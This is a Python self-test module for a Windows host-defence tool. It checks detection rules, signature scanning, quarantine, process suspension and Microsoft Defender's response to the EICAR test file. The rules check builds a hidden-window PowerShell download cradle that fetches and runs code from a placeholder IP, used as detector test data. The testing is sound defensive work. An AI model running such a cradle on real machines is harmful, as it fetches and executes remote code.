"""Checks that HostGuard itself works on this PC: the rules fire, quarantine round-trips, a process
can be suspended and resumed, and Defender is awake. Everything it touches is its own temp folder
and its own child process.

The optional Defender check writes the EICAR test file, the industry's harmless stand-in for
malware, and times how fast Defender removes it. That raises a real Defender alert, which is the
point, so it only runs when asked for.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import time

from . import contain, paths, quarantine, util, winapi
from .detect import cmdline as cl
from .detect import content


def _check(name: str, fn) -> tuple[bool, str]:
    try:
        ok, detail = fn()
    except Exception as e:
        ok, detail = False, f"{type(e).__name__}: {e}"
    print(f"  {'PASS' if ok else 'FAIL'}  {name}: {detail}")
    return ok, detail


def run(live_defender: bool = False) -> int:
    work = tempfile.mkdtemp(prefix="hg-selftest-")
    results = []
    print("HostGuard self-test")

    def rules():
        sample = "powershell -w hidden -c \"" + "IE" + "X (New-Object Net.WebClient).Download" + "String('http://198.51.100.1/a')\""
        hits = {h.rule.id for h in cl.analyse_command(sample)}
        benign = cl.analyse_command(r'powershell.exe -NoProfile -File "C:\scripts\backup.ps1"')
        return ("cmd.download_cradle" in hits and not benign), f"{len(cl.RULES)} command rules loaded; attack sample matched, ordinary command did not"

    def signatures():
        hit = [s.id for s in content.scan(b"junk" + content.EICAR + b"junk")]
        clean = content.scan(b"an ordinary file with nothing in it" * 50)
        return (hit == ["eicar"] and not clean), f"{len(content.SIGNATURES)} byte signatures loaded; test pattern matched in memory"

    def vault():
        src = os.path.join(work, "sample.bin")
        body = os.urandom(2048)
        with open(src, "wb") as f:
            f.write(body)
        put = quarantine.put(src, None, "self-test")
        if not put.get("ok") or os.path.exists(src):
            return False, put.get("message", "file was not removed")
        back = quarantine.restore(put["id"])
        with open(src, "rb") as f:
            same = f.read() == body
        return bool(back.get("ok")) and same, "a file went into the vault and came back byte for byte"

    def process():
        child = subprocess.Popen([os.path.join(paths.SYSTEM32, "cmd.exe"), "/q", "/k"], stdin=subprocess.PIPE,
                                 stdout=subprocess.DEVNULL, creationflags=util.NO_WINDOW)
        try:
            time.sleep(0.3)
            ent = {"pid": child.pid, "name": "cmd.exe", "created": winapi.process_created(child.pid)}
            s = contain.execute(None, "suspend", ent)
            was = winapi.is_suspended(child.pid)
            r = contain.execute(None, "resume", ent, force=True)
            now = winapi.is_suspended(child.pid)
            guard = contain.execute(None, "kill", {"pid": 4})
            return (bool(s.get("ok")) and was is True and bool(r.get("ok")) and now is False and bool(guard.get("refused"))), \
                "a test process was suspended, confirmed suspended, and resumed; a system process was refused"
        finally:
            child.kill()
            child.wait(timeout=5)
            child.stdin.close()

    def defender_awake():
        d = util.run_ps("defender", timeout=60) or {}
        st = d.get("status") or {}
        ok = bool(st.get("RealTimeProtectionEnabled") and st.get("AntivirusEnabled"))
        return ok, (f"real-time protection on, definitions {st.get('AntivirusSignatureAge')} day(s) old, tamper protection "
                    f"{'on' if st.get('IsTamperProtected') else 'OFF'}") if ok else "real-time protection is NOT on"

    def defender_reacts():
        path = os.path.join(work, "eicar-test.com")
        started = time.time()
        try:
            with open(path, "wb") as f:
                f.write(content.EICAR)
        except OSError as e:
            return True, f"Defender refused the write outright ({e.strerror or e})"
        for _ in range(60):
            time.sleep(0.25)
            try:
                with open(path, "rb") as f:
                    f.read(8)
            except OSError:
                return True, f"Defender blocked or removed the test file after {time.time() - started:.1f}s"
            if not os.path.exists(path):
                return True, f"Defender removed the test file after {time.time() - started:.1f}s"
        return False, "the EICAR test file was still readable after 15 seconds: real-time protection did not react"

    checks = [("detection rules", rules), ("byte signatures", signatures), ("quarantine vault", vault)]
    if winapi.IS_WINDOWS:
        checks += [("process containment", process), ("Defender is running", defender_awake)]
        if live_defender:
            checks.append(("Defender reacts to a test file", defender_reacts))
    for name, fn in checks:
        results.append(_check(name, fn)[0])
    shutil.rmtree(work, ignore_errors=True)
    print(f"{sum(results)} of {len(results)} checks passed")
    return 0 if all(results) else 1
